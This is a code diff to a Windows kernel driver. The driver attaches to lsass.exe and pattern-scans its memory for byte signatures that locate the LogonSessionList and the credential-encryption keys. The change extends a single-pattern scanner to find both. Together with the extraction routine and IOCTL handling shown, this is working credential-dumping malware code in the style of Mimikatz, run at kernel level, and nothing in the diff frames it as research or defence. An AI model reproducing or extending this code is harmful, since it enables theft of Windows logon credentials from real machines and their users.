@@ -95,7 +95,10 @@ namespace driver {
 
 
 	}
-
+	struct Patterns {
+		PVOID LogonSessionListPattern;
+		PVOID KeysPattern;
+	};
 	struct Request {
 		HANDLE hPID; //
 		PVOID pTargetMemory; //victim process
@@ -105,9 +108,10 @@ namespace driver {
 		PVOID pBase;
 		PVOID pEnd;
 		//ULONG_PTR offset;
-		PVOID pattern;
+		Patterns Patterns;
 
 	};
+
 	//3 functinos for uDriverOBject event handleing.
 
 	NTSTATUS create(PDEVICE_OBJECT pDeviceObject, PIRP irp) { 		//irp is the packet that carries the data between ICTL devices.
@@ -125,59 +129,85 @@ namespace driver {
 #define CHUNK_SIZE 4096
 
 	// Compare 12 bytes at base with pattern
-	bool compare12(UCHAR* base, UCHAR pattern[12]) {
-		for (int i = 0; i < 12; i++) {
+	bool compareN(UCHAR* base, UCHAR* pattern, size_t length) {
+		for (int i = 0; i < length; i++) {
 			if (base[i] != pattern[i])
 				return false;
 		}
 		return true;
 	}
 
+#define patternsToSearch 2
+
 	// Scan memory from pBase to pEnd in chunks for the pattern
-	PVOID patternScanner(PVOID pBase, PVOID pEnd) {
-		UCHAR pattern[12] = { 0x33,0xFF,0x41,0x89,0x37,0x4C,0x8B,0xF3,0x45,0x85,0xC0,0x74 };
-		const size_t patternLength = sizeof(pattern);
+	Patterns patternScanner(PVOID pBase, PVOID pEnd) {
+		
+		Patterns ReturnPatternPointers = { 0 };
+
+		typedef struct {
+			UCHAR* bytes;
+			size_t length;
+		} BytePattern;
+
+		UCHAR LslPattern[12] = { 0x33,0xFF,0x41,0x89,0x37,0x4C,0x8B,0xF3,0x45,0x85,0xC0,0x74 };
+		UCHAR keyPattern[16] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
+
+		BytePattern BytePatterns[] = {
+			{LslPattern,sizeof(LslPattern)},
+			{keyPattern,sizeof(keyPattern)}
+		};
+
+
 
 		UCHAR* start = (UCHAR*)pBase;
 		UCHAR* end = (UCHAR*)pEnd;
+		for (int i = 0;i<sizeof(BytePatterns)/sizeof(BytePatterns[0]);i++){
+			
+			size_t patternLength = BytePatterns[i].length;
+			PUCHAR pattern = BytePatterns[i].bytes;
 
-		for (UCHAR* chunkStart = start; chunkStart + patternLength <= end; chunkStart += (CHUNK_SIZE - (patternLength - 1))) {
-			size_t remaining = end - chunkStart;
+			for (UCHAR* chunkStart = start; chunkStart + patternLength <= end; chunkStart += (CHUNK_SIZE - (patternLength - 1))) {
+				size_t remaining = end - chunkStart;
 
-			size_t scanSize;
+				size_t scanSize;
 
-			if (remaining < CHUNK_SIZE)
-				scanSize = remaining;
-			else
-				scanSize = CHUNK_SIZE;
+				if (remaining < CHUNK_SIZE)
+					scanSize = remaining;
+				else
+					scanSize = CHUNK_SIZE;
 
 
-			if (scanSize < 12) break; // nothing left to scan
+				if (scanSize < 12) break; // nothing left to scan
 
-			__try {
-				for (size_t j = 0; j <= scanSize - 12; j++) {
-					if (compare12(chunkStart + j, pattern)) {
-						debug_printer("FOUND IT! Setting offset....\n");
+				__try {
+					for (size_t j = 0; j <= scanSize - 12; j++) {
+						if (compareN(chunkStart + j,pattern, patternLength)) {
+							debug_printer("FOUND IT! Setting offset....\n");
 
-						ULONG_PTR address = (ULONG_PTR)(chunkStart + j);
-						ULONG offset = (ULONG)(((UCHAR*)chunkStart + j) - (UCHAR*)pBase);
-						DbgPrint("Win1803 Location: 0x%p\n", (PVOID)address);
-						DbgPrint("Offset Location: 0x%llu\n", (unsigned long long)offset);
+							ULONG_PTR address = (ULONG_PTR)(chunkStart + j);
+							ULONG offset = (ULONG)(((UCHAR*)chunkStart + j) - (UCHAR*)pBase);
+							DbgPrint("Win1803 Location: 0x%p\n", (PVOID)address);
+							DbgPrint("Offset Location: 0x%llu\n", (unsigned long long)offset);
 
-						return (PVOID)address; // pattern found
+							if (i == 0) {
+								ReturnPatternPointers.LogonSessionListPattern = (PVOID)address;
+							}
+							else if (i == 1) {
+								ReturnPatternPointers.KeysPattern = (PVOID)address;
+								return ReturnPatternPointers;
+							}
+						}
 					}
 				}
+				__except (EXCEPTION_EXECUTE_HANDLER) {
+					// Skip this chunk safely
+					debug_printer("Exception handler for pattern search...\n");
+				}
+				KeShouldYieldProcessor(); // Yield CPU to avoid watchdog timeout
 			}
-			__except (EXCEPTION_EXECUTE_HANDLER) {
-				// Skip this chunk safely
-				debug_printer("Exception handler for pattern search...\n");
-
-			}
-
-			KeShouldYieldProcessor(); // Yield CPU to avoid watchdog timeout
 		}
 
-		return (PVOID)0; // pattern not found
+		return ReturnPatternPointers; // pattern not found
 	}
 
 	void extract(PEPROCESS target_process, PVOID pLogonSessionList) {
@@ -290,7 +320,7 @@ namespace driver {
 			debug_printer("Entering find lsl...\n");
 			debug_printer("Setting passive...\n");
 			if (KeGetCurrentIrql() != PASSIVE_LEVEL) {
-				request->pattern = 0;
+				request->Patterns = { 0 };
 				status = STATUS_INVALID_DEVICE_STATE;
 				break;
 			}
@@ -306,12 +336,18 @@ namespace driver {
 				_try{
 					_try{
 						//now that we're attached all reference in memory go through lsass.exe
-						PVOID pLogonSessionList = patternScanner(request->pBase, request->pEnd);
+						Patterns RetrunBytePatters = {0};
+						RetrunBytePatters = patternScanner(request->pBase, request->pEnd);
+						PVOID pLogonSessionList = RetrunBytePatters.LogonSessionListPattern;
+						PVOID pKeyPattern = RetrunBytePatters.KeysPattern;
 						debug_printer("Done searching for pattern...\n");
-						if (pLogonSessionList != NULL) {
-							request->pattern = pLogonSessionList;
-							debug_printer("Found lsl offset???!!!! <-----\n...");
-							DbgPrint("Pointer (from try) : 0x%p\n", pLogonSessionList);
+						if (pLogonSessionList != NULL && pKeyPattern != NULL) {
+							request->Patterns.LogonSessionListPattern = pLogonSessionList;
+							request->Patterns.KeysPattern = pKeyPattern;
+							debug_printer("Found lsl & key offset???!!!! <-----\n...");
+							DbgPrint("LSL Pointer (from try) : 0x%p\n", pLogonSessionList);
+							DbgPrint("Key Pointer (from try) : 0x%p\n", pKeyPattern);
+
 							/*if (MmIsAddressValid(pLogonSessionList)) {
 								DbgPrint("Pointer is valid...\n");
 								DbgPrint("Zero Dark 30 - running extraction mission...\n");
@@ -321,12 +357,15 @@ namespace driver {
 							status = STATUS_SUCCESS;
 						}
 						else {
-							debug_printer("lsl offset not found... :( \n...");
-							request->pattern = NULL;
+							debug_printer("patterns not found... :( \n...");
+							request->Patterns.LogonSessionListPattern = NULL;
+							request->Patterns.KeysPattern = NULL;
+
 						}
 					}
 					_except(EXCEPTION_EXECUTE_HANDLER) {
-						request->pattern = NULL;
+						request->Patterns.LogonSessionListPattern = NULL;
+						request->Patterns.KeysPattern = NULL;
 					}
 				}
 					_finally{
@@ -349,7 +388,7 @@ namespace driver {
 			debug_printer("Setting passive...\n");
 			// Must be at PASSIVE_LEVEL to access paged memory
 			if (KeGetCurrentIrql() != PASSIVE_LEVEL) {
-				request->pattern = 0;
+				request->Patterns.LogonSessionListPattern = 0;
 				status = STATUS_INVALID_DEVICE_STATE;
 				break;
 			}
